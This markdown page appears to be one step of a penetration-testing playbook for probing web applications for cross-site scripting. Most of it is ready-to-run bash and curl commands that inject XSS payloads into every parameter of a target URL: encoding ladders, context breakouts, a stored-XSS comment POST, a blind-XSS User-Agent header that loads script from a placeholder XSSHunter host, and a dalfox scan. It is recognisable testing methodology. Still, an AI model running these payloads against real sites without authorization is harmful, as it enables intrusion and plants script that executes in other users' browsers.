# XSS — Probe

## Purpose
Inject XSS payloads into every discovered injection point. Test raw, URL-encoded, double-encoded, and context-specific variants. Quick pass to identify reflection and determine render context before committing to deeper fuzzing.

## Required Variables
- `$TARGET_URL` — base target URL
- `$OUTDIR` — output root
- `$PARAMS_FILE` — path to discovered params (`$OUTDIR/xss/discovered_params_get.txt`)

## Commands

### Quick Reflection Test Payloads

```bash
export PATH="/opt/homebrew/bin:$HOME/go/bin:$HOME/Library/Python/3.14/bin:$PATH"

# Canonical probe payload
XSS_IMG="<img src=x onerror=alert(1)>"
XSS_SVG="<svg/onload=alert(1)>"
XSS_DETAILS="<details/open/ontoggle=alert(1)>"

# P1 — Single-payload sweep on all params
while read -r line; do
  param=$(echo "$line" | awk '{print $NF}')
  enc=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${XSS_SVG}'))")
  curl -s "$TARGET_URL?${param}=${enc}" | grep -c 'onload=alert' && \
    echo "[!] REFLECTED: param=$param on $TARGET_URL" | tee -a "$OUTDIR/xss/reflected_hits.txt"
done < "$OUTDIR/xss/all_param_names.txt"

# P2 — Full encoding ladder on the most promising param
PARAM="${1:-q}"  # most common search param

# Raw
curl -s "$TARGET_URL?${PARAM}=<img src=x onerror=alert(1)>" > "$OUTDIR/xss/ref_raw_${PARAM}.html"
# URL encoded
curl -s "$TARGET_URL?${PARAM}=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E" > "$OUTDIR/xss/ref_urlenc_${PARAM}.html"
# Double URL encoded
curl -s "$TARGET_URL?${PARAM}=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E" > "$OUTDIR/xss/ref_dblenc_${PARAM}.html"
# HTML entity encoded
curl -s "$TARGET_URL?${PARAM}=%26lt%3Bimg%26gt%3B" > "$OUTDIR/xss/ref_entity_${PARAM}.html"

# P3 — Context-specific probes
# Attribute context (href/src)
curl -s "$TARGET_URL/redirect?url=javascript:alert(1)" >> "$OUTDIR/xss/context_href.txt"
# Script context breakout
curl -s "$TARGET_URL/api?callback=';alert(1);//" >> "$OUTDIR/xss/context_script.txt"
# Comment context breakout
curl -s "$TARGET_URL/page?q=--><img src=x onerror=alert(1)><!--" >> "$OUTDIR/xss/context_comment.txt"

# P4 — POST body injection for stored XSS
curl -s -X POST "$TARGET_URL/comment" \
  -d "name=test&email=test@test.com&comment=%3Csvg%2Fonload%3Dalert(1)%3E" \
  -o "$OUTDIR/xss/stored_probe_response.txt"

# P5 — Header injection probe (blind XSS via User-Agent)
XSSH="https://YOUR_XSSHUNTER.xss.ht"
curl -s "$TARGET_URL/" -H "User-Agent: Mozilla\"><script src=${XSSH}></script>" -o /dev/null
echo "Blind XSS probe sent via User-Agent. Check XSSHunter dashboard."

# P6 — dalfox quick automated scan
dalfox url "$TARGET_URL?${PARAM}=test" --silence --skip-bav -o "$OUTDIR/xss/dalfox_quick.txt"
```

## Detection Signals
- Response body contains the injected tag or event handler unencoded → **reflected XSS confirmed**
- grep count > 0 for `onerror=alert`, `onload=alert`, or `<svg` → reflection detected
- dalfox output contains `[POC]` or `[VULN]` → automated confirmation
- POST response shows different content vs baseline → potential stored injection

## False Positives
- Tag reflected inside `<textarea>` or `<code>` block — not exploitable without breakout
- Payload reflected but HTML-entity-encoded → test next encoding level
- dalfox false positives on CSP-protected pages — verify with manual curl

## Next
├── If any `grep -c` returns > 0 → go to `03-verify.md` for exploitation and PoC
├── If dalfox finds `[POC]` → go to `03-verify.md` for manual validation
├── If no reflection on any param → test POST body and headers; consider blind XSS
├── If all negative → go to `06-false-positive-filter.md` to rule out encoding misses
└── Always → save `reflected_hits.txt` as confirmed injection points